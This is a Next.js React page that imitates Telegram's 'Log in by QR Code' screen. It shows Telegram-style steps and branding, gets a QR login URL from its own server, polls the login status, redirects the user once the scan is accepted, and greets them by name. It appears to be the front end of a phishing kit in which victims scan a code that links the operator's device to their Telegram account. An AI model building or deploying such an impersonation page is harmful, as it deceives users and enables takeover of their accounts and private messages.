"use client";

import { useEffect, useMemo, useRef, useState } from "react";
// import QRCode from "react-qr-code";
import { QRCode } from "react-qrcode-logo";
import { useRouter } from "next/navigation";
import { Inter } from "next/font/google";
import { motion } from "framer-motion";
import Image from 'next/image';
import { img } from "framer-motion/client";
// --- Timings you can tweak ---
 
const POLL_INTERVAL_MS = 5000; // status poll cadence
const QR_SIZE = 256;
const inter = Inter({ subsets: ["latin"], weight: ["500", "600"] });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

export default function QrPage() {
  // const inter = Inter({ subsets: ['latin'], weight: ['500','600'] });

  const router = useRouter();
  const navigatedRef = useRef(false);

  // Data/state
  const [qrUrl, setQrUrl] = useState("");
  const [key, setKey] = useState("");
  const [expiresAt, setExpiresAt] = useState(0);
  const [accepted, setAccepted] = useState(false);
  const [authorized, setAuthorized] = useState(false);
  const [me, setMe] = useState(null);
  const [popped, setPopped] = useState(false);

  // UI gates
  const [uiReady, setUiReady] = useState(true); // initial gate (5–10s)
  // const [isRefreshing, setIsRefreshing] = useState(false); // refresh animation gate

  const pollRef = useRef(null);

  // Fixed column width so everything aligns with the QR
  const COL_WIDTH = 250;
  const BADGE = Math.round(COL_WIDTH * 0.2); // ~20% of QR

  // track if we've already played the pop once
  useEffect(() => {
    if (uiReady && !popped) setPopped(true);
  }, [uiReady, popped]);

  // Randomize initial delay between 5–10s
  // const initialDelayMs = useMemo(() => {
  //   const span = INITIAL_DELAY_MAX_MS - INITIAL_DELAY_MIN_MS;
  //   return INITIAL_DELAY_MIN_MS + Math.floor(Math.random() * (span + 1));
  // }, []);

  // -------- API helpers --------
  async function fetchQr(force = false) {
    const res = await fetch("/api/telegram/qr", { cache: "no-store" });
    const data = await res.json();

    // Rare fast-path if server already authorized
    if (data.authorized && data.session) {
      setAuthorized(true);
      await fetchMe(data.key);
      return;
    }

    setQrUrl(data.qrUrl || "");
    setKey(data.key || "");
    setExpiresAt(data.expiresAt || Date.now() + 60_000);
    setAccepted(false);
  }

  async function fetchMe(k = key) {
    const res = await fetch("/api/telegram/me", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ key: k }),
    });
    const data = await res.json();
    if (!data.error) setMe(data);
  }

  // Start-up: fetch QR immediately but hold UI for 5–10s
  useEffect(() => {
    let cancelled = false;
    (async () => {
      await fetchQr(true);
      // await sleep(initialDelayMs);
      if (!cancelled) setUiReady(true);
    })();
    return () => {
      cancelled = true;
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  // Status polling (only when we HAVE a key+qr)
  // Status polling (only when we HAVE a key+qr)
  useEffect(() => {
    if (!key || !qrUrl) return;

    if (pollRef.current) clearInterval(pollRef.current);

    pollRef.current = setInterval(async () => {
      const res = await fetch("/api/telegram/qr/status", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key }),
      });
      const data = await res.json();

      if (data.invalid) {
        if (pollRef.current) clearInterval(pollRef.current);
        // await doRefreshAnimation();
        return;
      }

      if (data.accepted && !navigatedRef.current) {
        setAccepted(true);
        navigatedRef.current = true;
        if (pollRef.current) clearInterval(pollRef.current);
        router.push(`/welcome?key=${encodeURIComponent(key)}`); // safe to use here
        return;
      }

      if (data.authorized) {
        if (pollRef.current) clearInterval(pollRef.current);
        setAuthorized(true);
        setQrUrl("");
        router.push(`/welcome?key=${encodeURIComponent(key)}`);
        return;
      }

      if (data.expired || (expiresAt && Date.now() >= expiresAt)) {
        if (pollRef.current) clearInterval(pollRef.current);
        // await doRefreshAnimation();
        return;
      }
    }, POLL_INTERVAL_MS);

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
    // ⬇️ keep this array length constant
  }, [key, qrUrl, expiresAt]); // <-- remove `router`

  // Play the 4.5s animation BEFORE showing a new QR
  // const doRefreshAnimation = async () => {
  //   setIsRefreshing(true);
  //   await sleep(REFRESH_ANIMATION_MS);
  //   await fetchQr(); // get a new token/qr
  //   setIsRefreshing(false);
  // };

  // ------- UI -------
  return (
    <div
      className={`${inter.className} min-h-screen flex items-start md:items-center justify-center px-6 -mt-6 md:-mt-10 bg-white p-4`}
    >
      <div className="w-full flex flex-col items-center pt-16 md:pt-0">
        {/* NOT AUTHORIZED VIEW */}
        {!authorized && (
          <div className="flex flex-col items-center">
            {/* QR — only this square shows loader/refresh overlay */}
<Image
      src="/tele-parma.png"
      alt="Telegram placeholder"
      width={QR_SIZE}
      height={QR_SIZE}
      className="rounded-xl object-contain"
      priority
    />
            {/* <motion.div
              className="relative"
              style={{ width: COL_WIDTH, height: COL_WIDTH }}
              initial={popped ? false : { scale: 0.85, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{
                type: "spring",
                stiffness: 420,
                damping: 30,
                mass: 0.6,
              }}
            >
              {uiReady && qrUrl ? (
                <>
                  {/* <QRCode
                    value={qrUrl}
                    size={COL_WIDTH}
                    ecLevel="H"
                    eyeRadius={[
                      { outer: 10 , inner: 5 }, // top-left
                      { outer: 14, inner: 6 }, // top-right
                      { outer: 14, inner: 6 }, // bottom-left
                    ]}
                  /> */
                  
                  }


                  {/* Blue spinner overlay only while refreshing */}

                  {/* Center GIF badge (only when not refreshing) */}

                  {/* <div
                    className="pointer-events-none absolute inset-0 flex items-center justify-center"
                    aria-hidden
                  >
                    <div
                      className="  bg-white ring-1 ring-gray-200 overflow-hidden"
                      style={{ width: BADGE, height: BADGE }}
                    >
                      <Image
                      src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNDAgMjQwJz4KICA8Y2lyY2xlIGN4PScxMjAnIGN5PScxMjAnIHI9JzEyMCcgZmlsbD0nIzMzOTBFQycvPgogIDxwYXRoIGZpbGw9J3doaXRlJyBkPSdNNDcgMTIwbDE0MS01NGM2LTIgMTAgMSA4IDlsLTI0IDExM2MtMiA4LTcgMTAtMTMgNmwtNDAtMjktMTkgMThjLTIgMi00IDMtOCAzbDMtNDEgNzUtNjhjMy0zLTEtNC01LTFsLTkyIDU4LTM5LTEyYy04LTItOC04IDEtMTJ6Jy8+Cjwvc3ZnPg=="
                      width={200}
                      height={200}
                      alt="Telegram"
                      className="w-full h-full object-contain rounded-full"
                      unoptimized
                    />
                    </div>
                  </div> */}
                {/* </>
              ) : (
                <div className="w-full h-full rounded-lg bg-gray-100 animate-pulse" />
              )
            </motion.div>} */}

            {/* Title — same width as QR */}
            <div className="mt-8">
              <h1 className="text-2xl md:text-3xl leading-6 font-semibold text-gray-900 text-center whitespace-nowrap tracking-[-0.01em]">
                Log in to Telegram by QR Code
              </h1>
            </div>

            {/* Steps — same width and left-aligned */}
            <ol className="mt-12 space-y-3 text-gray-800 mx-auto text-xl md:text-2xl">
              <Step n={1} text={<span>Open Telegram on your phone</span>} />
              <Step
                n={2}
                text={
                  <span>
                    Go to <b>Settings</b> &gt; <b>Devices</b> &gt;{" "}
                    <b>Link Desktop Device</b>
                  </span>
                }
              />
              <Step
                n={3}
                text={
                  <span>Point your phone at this screen to confirm login</span>
                }
              />
            </ol>

            {/* Accepted hint — same width */}
            {accepted && (
              <p className="mt-3 text-sm text-green-600 text-left mx-auto">
                ✅ Scan detected — tap <b>Allow</b> in Telegram to confirm.
              </p>
            )}

            {/* “Log in by phone number” link — same width and centered */}
            <div className="mt-8 mx-auto ">
              <button
                type="button"
                className="inline-flex items-center  gap-3 rounded-lg px-9 py-2
                text-blue-600 uppercase tracking-wide text-[15px] font-medium
                transition hover:text-blue-700 hover:bg-blue-50 hover:shadow-sm
                focus:outline-none focus:ring-2 focus:ring-blue-500/40
               "
                onClick={() => {
                  router.push("/");
                }}
              >
                LOG IN BY PHONE NUMBER
              </button>
            </div>
          </div>
        )}

        {/* AUTHORIZED VIEW */}
        {authorized && (
          <div className="text-center py-10">
            <p className="text-xl font-semibold">🎉 Authorized!</p>
            <p className="mt-2 text-gray-700">
              {me ? (
                <>
                  Welcome, <b>{me.firstName || me.username || "there"}</b> 👋
                </>
              ) : (
                "Welcome! 👋"
              )}
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

/** Step row (JSX version) */
function Step({ n, text }) {
  return (
    <li className="flex items-start gap-3">
      <span
        className="
          inline-grid place-items-center
          w-6 aspect-square rounded-full
          bg-[rgb(51,144,236)] text-white
          text-[13px] font-medium leading-none
          select-none flex-shrink-0
        "
      >
        {n}
      </span>
      <span className="text-[15px] leading-6">{text}</span>
    </li>
  );
}
